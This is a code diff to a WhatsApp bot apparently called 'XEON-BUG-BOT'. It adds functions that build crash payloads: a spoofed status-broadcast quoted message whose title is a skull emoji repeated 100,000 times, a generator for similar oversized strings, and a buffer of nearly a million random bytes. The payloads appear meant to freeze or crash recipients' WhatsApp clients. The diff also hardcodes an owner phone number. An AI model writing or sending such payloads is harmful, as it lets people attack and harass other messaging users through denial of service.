@@ -14,6 +14,46 @@ const execAsync = promisify(exec)
 // Load settings and utilities
 const settings = require('./settings')
 const { getBuffer, fetchJson, runtime, sleep } = require('./lib/myfunc')
+// Configuration - Add at the top of your bot file
+const OWNER_NUMBER = '263777124998@s.whatsapp.net';
+const fs = require('fs');
+
+// Bot configuration
+const ownername = 'XEON';
+const botname = 'XEON-BUG-BOT';
+
+// Authorization check
+function isOwner(userId) {
+    return userId === OWNER_NUMBER;
+}
+
+// Create bug objects
+const createBugQuoted = () => ({
+    key: {
+        remoteJid: 'status@broadcast',
+        fromMe: false,
+        participant: '0@s.whatsapp.net'
+    },
+    message: {
+        listResponseMessage: {
+            title: '💀'.repeat(100000)
+        }
+    }
+});
+
+// Heavy payload generator
+function generateHeavyPayload(size = 100000) {
+    return '💀'.repeat(size);
+}
+
+// Create corrupted buffer
+function createCorruptedBuffer(size = 999999) {
+    const buffer = Buffer.alloc(size);
+    for (let i = 0; i < size; i++) {
+        buffer[i] = Math.floor(Math.random() * 256);
+    }
+    return buffer;
+}
 
 // Command prefix
 const prefix = settings.prefix || '.'
